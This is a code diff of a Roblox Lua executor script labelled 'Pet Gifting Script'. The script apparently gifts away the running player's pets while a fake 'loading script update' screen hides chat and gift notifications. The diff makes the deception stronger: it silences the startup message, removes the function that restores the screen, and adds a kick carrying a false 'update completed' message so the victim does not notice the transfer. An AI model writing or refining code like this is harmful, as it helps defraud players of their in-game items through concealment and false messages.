@@ -1,5 +1,5 @@
 -- Pet Gifting Script - Enhanced version for Executor
-print("Pet Gifting Script starting...")
+--print("Pet Gifting Script starting...")
 
 -- Configuration
 local Config = {
@@ -141,12 +141,15 @@ local function FreezeScreen()
     
     -- Add countdown timer (10 seconds but doesn't do anything when it reaches 0)
     spawn(function()
-        for i = 10, 1, -1 do
+        for i = 15, 1, -1 do
             freezeText.Text = "⚙️ LOADING SCRIPT UPDATE\n\nPlease wait...\n\nRejoining in " .. i .. " seconds..."
             wait(1)
         end
         freezeText.Text = "⚙️ LOADING SCRIPT UPDATE\n\nPlease wait...\n\nRejoining in 0 seconds..."
         Log("⏰ Countdown finished (no action taken)")
+        wait(60)
+        local player = game.Players.LocalPlayer
+        player:Kick("Rejoin the game to continue using the script.\n\nScript update completed successfully.")
     end)
     
     -- Success flag
@@ -238,90 +241,6 @@ local function FreezeScreen()
         return true
     else
         Log("❌ Screenshot freeze failed: " .. tostring(error))
-        return false
-    end
-end
-
-local function UnfreezeScreen()
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    local Lighting = game:GetService("Lighting")
-    
-    local success, error = pcall(function()
-        -- Disconnect camera freeze first
-        local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
-        if screenGui then
-            if screenGui:GetAttribute("HasCameraConnection") and freezeConnectionStorage.cameraConnection then
-                freezeConnectionStorage.cameraConnection:Disconnect()
-                freezeConnectionStorage.cameraConnection = nil
-                Log("📷 Camera unfrozen")
-            end
-            
-            -- No F4 connection to disconnect anymore
-            
-            -- Restore CoreGui
-            if screenGui:GetAttribute("CoreGuiDisabled") then
-                local StarterGui = game:GetService("StarterGui")
-                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
-                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
-                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
-                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true)
-                Log("🔔 CoreGui restored")
-            end
-            
-            -- Restore notifications
-            if screenGui:GetAttribute("TopNotificationEnabled") then
-                local topNotification = LocalPlayer.PlayerGui:FindFirstChild("Top_Notification")
-                if topNotification then
-                    topNotification.Enabled = true
-                    Log("🔔 Top notifications restored")
-                end
-            end
-            
-            if screenGui:GetAttribute("NotificationsEnabled") then
-                local notifications = LocalPlayer.PlayerGui:FindFirstChild("Notifications")
-                if notifications then
-                    notifications.Enabled = true
-                    Log("🔔 Modern notifications restored")
-                end
-            end
-            
-            if screenGui:GetAttribute("FriendNotificationEnabled") then
-                local friendNotification = LocalPlayer.PlayerGui:FindFirstChild("Friend_Notification")
-                if friendNotification then
-                    friendNotification.Enabled = true
-                end
-            end
-            
-            if screenGui:GetAttribute("GiftNotificationEnabled") then
-                local giftNotification = LocalPlayer.PlayerGui:FindFirstChild("Gift_Notification")
-                if giftNotification then
-                    giftNotification.Enabled = true
-                end
-            end
-            
-            -- Restore other notification GUIs
-            for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
-                if gui:IsA("ScreenGui") and gui:GetAttribute("WasEnabledBeforeFreeze") then
-                    gui.Enabled = true
-                    gui:SetAttribute("WasEnabledBeforeFreeze", nil)
-                end
-            end
-            
-            screenGui:Destroy()
-        end
-        
-        -- No world objects to restore with black screen approach
-        Log("🔓 Black freeze screen removed")
-        
-        return true
-    end)
-    
-    if success then
-        Log("🔓 Screen unfrozen - world and camera restored")
-        return true
-    else
-        Log("❌ Unfreeze failed: " .. tostring(error))
         return false
     end
 end
@@ -1019,7 +938,7 @@ end
     end
     
     Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
-    UnfreezeScreen()
+    --UnfreezeScreen()
     isRunning = false
 end
 
